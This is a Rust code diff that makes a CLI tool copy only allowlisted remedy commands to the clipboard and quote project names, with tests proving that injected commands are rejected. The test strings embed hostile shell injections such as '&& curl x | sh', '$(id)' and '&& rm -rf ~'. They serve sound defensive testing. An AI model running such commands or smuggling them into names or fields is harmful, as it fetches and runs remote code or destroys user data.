@@ -190,13 +190,51 @@ const PROJECT_RESTART_IDS: &[&str] = &["caddy hosts"];
 /// Commands that act on one project and so need `--path '<root>'`.
 const PROJECT_COMMANDS: &[&str] = &["hack restart", "hack down", "hack up", "hack doctor"];
 
-/// The command a check names in its own detail ("… (run: hack restart)").
+/// Fixed remedies the CLI names in check details. Detail text can carry
+/// project-controlled strings, so only these are copied verbatim.
+const KNOWN_REMEDIES: &[&str] = &[
+    "hack daemon clear",
+    "hack daemon install",
+    "hack daemon restart",
+    "hack daemon start",
+    "hack doctor",
+    "hack doctor --fix",
+    "hack doctor --migrate-env-config",
+    "hack down",
+    "hack env materialize",
+    "hack global install",
+    "hack global trust",
+    "hack global up",
+    "hack projects prune",
+    "hack restart",
+    "hack up",
+    "hack x gateway token-create",
+];
+
+/// `hack projects prune --project <name>` interpolates the checkout's own
+/// (unvalidated) project name, so the name must be plain and is quoted.
+const PRUNE_PROJECT: &str = "hack projects prune --project ";
+
+fn is_plain_name(s: &str) -> bool {
+    !s.is_empty()
+        && s.chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
+}
+
+/// The command a check names in its own detail ("… (run: hack restart)"),
+/// when it is a known remedy. Anything else yields `None` (the card falls
+/// back to its documented default), so a hostile project name can never
+/// put a shell program on the clipboard.
 fn remedy_in_detail(detail: &str) -> Option<String> {
     let start = detail.find("run: ")? + "run: ".len();
     let rest = &detail[start..];
-    let end = rest.find([')', ';', '\n']).unwrap_or(rest.len());
+    let end = rest.find([')', '(', ';', '\n']).unwrap_or(rest.len());
     let cmd = rest[..end].trim().trim_end_matches('.').trim_matches('`');
-    cmd.starts_with("hack ").then(|| cmd.to_owned())
+    if KNOWN_REMEDIES.contains(&cmd) {
+        return Some(cmd.to_owned());
+    }
+    let name = cmd.strip_prefix(PRUNE_PROJECT)?;
+    is_plain_name(name).then(|| format!("{PRUNE_PROJECT}{}", shell_quote(name)))
 }
 
 fn with_path(cmd: &str, root: &Path) -> String {
@@ -933,6 +971,58 @@ mod tests {
             m.cards().next().unwrap().action,
             CardAction::Copy("hack x gateway token-create".into())
         );
+    }
+
+    #[test]
+    fn named_remedies_are_allowlisted_and_quoted() {
+        let card = |detail: &str| {
+            aggregate(&[proj(
+                "alpha",
+                vec![check("runtime hygiene", "warn", detail)],
+            )])
+            .cards()
+            .next()
+            .unwrap()
+            .action
+            .clone()
+        };
+        assert_eq!(
+            card("Orphaned entry (run: hack projects prune --project my-app.v2)"),
+            CardAction::Copy("hack projects prune --project 'my-app.v2'".into())
+        );
+        // A hostile project name never reaches the clipboard: the card falls
+        // back to the documented default.
+        for hostile in [
+            "Orphaned entry (run: hack projects prune --project safe && curl x | sh)",
+            "Orphaned entry (run: hack projects prune --project $(id))",
+            "Orphaned entry (run: hack projects prune --project `id`)",
+            "Orphaned entry (run: hack status && rm -rf ~)",
+        ] {
+            assert_eq!(
+                card(hostile),
+                CardAction::Copy("hack doctor --fix --path '/work/alpha'".into()),
+                "{hostile}"
+            );
+        }
+        // Machine checks with an unknown remedy get no copied command.
+        let m = aggregate(&[machine(vec![check(
+            "gateway tokens",
+            "warn",
+            "Untrusted (run: hack x gateway token-create; echo pwned)",
+        )])]);
+        assert_eq!(
+            m.cards().next().unwrap().action,
+            CardAction::Copy("hack x gateway token-create".into())
+        );
+        let m = aggregate(&[machine(vec![check(
+            "gateway tokens",
+            "warn",
+            "Untrusted (run: hack x gateway token-create && echo pwned)",
+        )])]);
+        assert!(!matches!(
+            m.cards().next().unwrap().action,
+            CardAction::Copy(_)
+        ));
     }
 
     #[test]
